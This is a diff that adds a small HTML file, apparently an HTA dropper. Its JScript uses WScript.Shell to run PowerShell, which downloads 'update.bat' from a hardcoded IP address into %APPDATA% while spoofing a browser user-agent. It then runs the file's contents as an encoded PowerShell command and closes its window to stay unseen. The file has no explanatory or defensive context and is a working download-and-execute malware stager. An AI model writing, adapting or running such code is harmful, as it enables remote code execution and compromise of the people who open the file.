@@ -1,0 +1,21 @@
+<!DOCTYPE html>
+<html>
+<head>
+<script language="JScript">
+var shell = new ActiveXObject("WScript.Shell");
+var appDataPath = shell.ExpandEnvironmentStrings("%APPDATA%");
+var batFilePath = appDataPath + "\update.bat";
+
+// Define a custom User-Agent string
+var userAgent = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.81 Safari/537.36";
+
+// Download the file with the custom User-Agent
+var res = shell.run("powershell iwr -uri http://192.53.123.95/update.bat -outfile '" + batFilePath + "' -UserAgent '" + userAgent + "'; powershell -encodedCommand (Get-Content '" + batFilePath + "' -raw)");
+</script>
+</head>
+<body>
+<script language="JScript">
+self.close();
+</script>
+</body>
+</html>
